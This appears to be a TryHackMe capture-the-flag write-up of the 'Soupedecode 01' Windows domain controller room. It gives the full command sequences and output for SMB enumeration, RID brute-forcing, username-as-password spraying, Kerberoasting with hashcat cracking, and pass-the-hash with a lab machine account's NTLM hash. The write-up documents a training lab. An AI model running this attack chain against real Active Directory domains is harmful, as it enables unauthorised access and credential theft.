---
layout: single
title: THM - Soupedecode 01
date: 2025-11-01
classes: wide
header:
  teaser: /assets/images/thm-soupedecode-01/logo.png
  teaser_home_page: true
categories:
  - TryHackMe
  - Easy
  - Windows
tags:
  - smb-enum
  - hash-cracking
  - rid-bruteforcing
  - kerberoasting
  - pth
---

# Introduction
-------------

This writeup documents the penetration testing of the [**Soupedecode**](https://tryhackme.com/room/soupedecode01) machine from the [**TryHackMe**](https://tryhackme.com/) platform. In this ocasion, I'll get access in a Windows Server 2022 Domain Controller by enumerating the SMB service, perform a RID bruteforce attack and Kerberoasting to privesc.

<br>
# Information Gathering
------------------

After identifying the target's IP address, we need to enumerate as  much information as possible about the host.

A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
* TTL 64: Linux.
* TTL 128: Windows.

```bash
❯ ping -c 1 10.10.34.153
```
```
PING 10.10.34.153 (10.10.34.153) 56(84) bytes of data.
64 bytes from 10.10.34.153: icmp_seq=1 ttl=127 time=52.5 ms

--- 10.10.34.153 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 52.486/52.486/52.486/0.000 ms
```

In this case, the target seems to be a Windows machine. Let's perform a port scan with nmap.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.34.153 -oG allPorts
```
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 18:47 CET
Initiating SYN Stealth Scan at 18:47
Scanning 10.10.34.153 [65535 ports]
Discovered open port 3389/tcp on 10.10.34.153
Discovered open port 53/tcp on 10.10.34.153
Discovered open port 135/tcp on 10.10.34.153
Discovered open port 445/tcp on 10.10.34.153
Discovered open port 139/tcp on 10.10.34.153
Discovered open port 49716/tcp on 10.10.34.153
Discovered open port 593/tcp on 10.10.34.153
Discovered open port 49798/tcp on 10.10.34.153
Discovered open port 3268/tcp on 10.10.34.153
Discovered open port 49664/tcp on 10.10.34.153
Discovered open port 464/tcp on 10.10.34.153
Discovered open port 49667/tcp on 10.10.34.153
Discovered open port 3269/tcp on 10.10.34.153
Discovered open port 88/tcp on 10.10.34.153
Discovered open port 636/tcp on 10.10.34.153
Discovered open port 389/tcp on 10.10.34.153
Discovered open port 49675/tcp on 10.10.34.153
Discovered open port 9389/tcp on 10.10.34.153
Completed SYN Stealth Scan at 18:48, 40.06s elapsed (65535 total ports)
Nmap scan report for 10.10.34.153
Host is up, received user-set (0.16s latency).
Scanned at 2025-11-01 18:47:45 CET for 40s
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49716/tcp open  unknown          syn-ack ttl 127
49798/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.17 seconds
           Raw packets sent: 196594 (8.650MB) | Rcvd: 55 (2.420KB)
```

```bash
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389 10.10.34.153 -oN targeted
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 18:54 CET
Nmap scan report for 10.10.34.153
Host is up (0.053s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-01 17:54:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
|_ssl-date: 2025-11-01T17:55:11+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-01T17:54:31+00:00
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=11/1%Time=69064953%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2025-11-01T17:54:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.75 seconds
```

Nmap found some open ports and we can extract a lot of information from this big output:

- Open ports like 53, 88, 139, 445... are a good indication that we are facing a **Windows Domain Controller**.
- In the port 3389/tcp there is Microsoft Terminal Services and the version is 10.0.20348, that is, **Windows Server 2022** Version 21H2.
- The FQDN of the targeted machine is ``DC01.SOUPEDECODE.LOCAL`` and the target domain is ``SOUPEDECODE.LOCAL``

I'll add this in my ``/etc/hosts`` file:

```
10.10.34.153 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL
```

Using **netexec** I'll enumerate SMB shares and see if we can log in with the `guest` user and grants us read access to the **IPC$** share.

```bash
❯ nxc smb dc01.soupedecode.local -u 'guest' -p '' --shares
```
```
SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.10.34.153    445    DC01             [*] Enumerated shares
SMB         10.10.34.153    445    DC01             Share           Permissions     Remark
SMB         10.10.34.153    445    DC01             -----           -----------     ------
SMB         10.10.34.153    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.34.153    445    DC01             backup                          
SMB         10.10.34.153    445    DC01             C$                              Default share
SMB         10.10.34.153    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.34.153    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.34.153    445    DC01             SYSVOL                          Logon server share 
SMB         10.10.34.153    445    DC01             Users                           
```

We have read access to the $IPC shared resource.

Now, we can perform a **RID bruteforce attack** with netexec to enumerate users.

>A **RID brute-force attack** generally refers to an attempt to crack or guess a **Remote Identifier (RID)**, which is typically a unique identifier used in network protocols, operating systems, or systems like Windows for user accounts, groups, or security principles.

```bash
❯ nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000
```
```
SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.10.34.153    445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.34.153    445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB         10.10.34.153    445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB         10.10.34.153    445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB         10.10.34.153    445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB         10.10.34.153    445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB         10.10.34.153    445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB         10.10.34.153    445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
SMB         10.10.34.153    445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
...
SMB         10.10.34.153    445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB         10.10.34.153    445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
SMB         10.10.34.153    445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
...
SMB         10.10.34.153    445    DC01             2168: SOUPEDECODE\admin (SidTypeUser)
```

I'll save in valid_usernames.txt a list with all the users for later.

```bash
❯ nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000 \| grep SidTypeUser \| cut -d '\' -f 2 \| cut -d ' ' -f 1 > valid_usernames.txt
```

<br>
# Vulnerability Assessment
-----------

At this point we can try to bruteforce user's passwords using valid_usernames.txt and using the domain name, year, or some popular weak passwords, but all of that didn't worked.

But there's something that worked. That was attempting to log in the domain using **valid_usernames.txt both in the username and password fields**.

```bash
❯ nxc smb dc01.soupedecode.local -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success
```
```
SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

<br>
# Exploitation
------

We found the credentials ``ybob317:ybob317``

```bash
❯ nxc smb dc01.soupedecode.local -u 'ybob317' -p 'ybob317' --shares
```
```
SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.10.34.153    445    DC01             [*] Enumerated shares
SMB         10.10.34.153    445    DC01             Share           Permissions     Remark
SMB         10.10.34.153    445    DC01             -----           -----------     ------
SMB         10.10.34.153    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.34.153    445    DC01             backup                          
SMB         10.10.34.153    445    DC01             C$                              Default share
SMB         10.10.34.153    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.34.153    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.34.153    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.34.153    445    DC01             Users           READ            
```

Using those credentials we have read access to the Users shared resource. Let's access that resource to get the user flag.

```bash
❯ smbclient.py 'SOUPEDECODE.LOCAL/ybob317:ybob317@dc01.soupedecode.local'
```
```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Users
# cd ybob317/Desktop
# ls
drw-rw-rw-          0  Fri Jul 25 19:51:44 2025 .
drw-rw-rw-          0  Mon Jun 17 19:24:32 2024 ..
-rw-rw-rw-        282  Mon Jun 17 19:24:32 2024 desktop.ini
-rw-rw-rw-         33  Fri Jul 25 19:51:44 2025 user.txt
# get user.txt
```

<br>
# Post-Exploitation
-----------

> **Kerberoasting** is a post-exploitation attack technique targeting the Kerberos authentication protocol, enabling adversaries to extract encrypted service account credentials from Active Directory.

```bash
❯ nxc ldap 10.10.34.153 -u ybob317 -p ybob317 --kerberoast kerb.hash
```
```
LDAP        10.10.34.153    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL)
LDAP        10.10.34.153    389    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
LDAP        10.10.34.153    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.10.34.153    389    DC01             [*] Total of records returned 5
LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: file_svc, memberOf: [], pwdLastSet: 2024-06-17 19:32:23.726085, lastLogon: <never>
LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\file_svc*$...
LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: firewall_svc, memberOf: [], pwdLastSet: 2024-06-17 19:28:32.710125, lastLogon: <never>
LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\firewall_svc*$...
LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: backup_svc, memberOf: [], pwdLastSet: 2024-06-17 19:28:49.476511, lastLogon: <never>
LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\backup_svc*$...
LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: web_svc, memberOf: [], pwdLastSet: 2024-06-17 19:29:04.569417, lastLogon: <never>
LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\web_svc*$...
LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: monitoring_svc, memberOf: [], pwdLastSet: 2024-06-17 19:29:18.511871, lastLogon: <never>
LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\monitoring_svc*$...
```

Those are the accounts vulnerable to Kerberoasting, that's to say, we can **crack their password hashes** with **hashcat**.

```bash
❯ hashcat kerb.hash /usr/share/wordlists/rockyou.txt
```
```
...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\file_svc*$...:***REDACTED_PASSWORD***
```

We have the credentials of the ``file_svc`` user. Let's start enumerating shared resources again.

```bash
❯ nxc smb dc01.soupedecode.local -u 'file_svc' -p '***REDACTED_PASSWORD***' --shares
```
```
SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:***REDACTED_PASSWORD***
SMB         10.10.34.153    445    DC01             [*] Enumerated shares
SMB         10.10.34.153    445    DC01             Share           Permissions     Remark
SMB         10.10.34.153    445    DC01             -----           -----------     ------
SMB         10.10.34.153    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.34.153    445    DC01             backup          READ            
SMB         10.10.34.153    445    DC01             C$                              Default share
SMB         10.10.34.153    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.34.153    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.34.153    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.34.153    445    DC01             Users            
```

![](/assets/images/thm-soupedecode-01/backup.png)

It seems we got a hashdump of some machine accounts. Let's see if any of them is valid.

```bash
❯ cat backup_extract.txt | cut -d: -f1 > backup_users.txt
❯ cat backup_extract.txt | cut -d: -f4 > backup_hashes.txt
❯ nxc smb 10.10.34.153 -u backup_users.txt -H backup_hashes.txt --no-brute
```
```
...
SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

Now let's get a shell in the machine using ``impacket-psexec``

![](/assets/images/thm-soupedecode-01/root_flag.png)





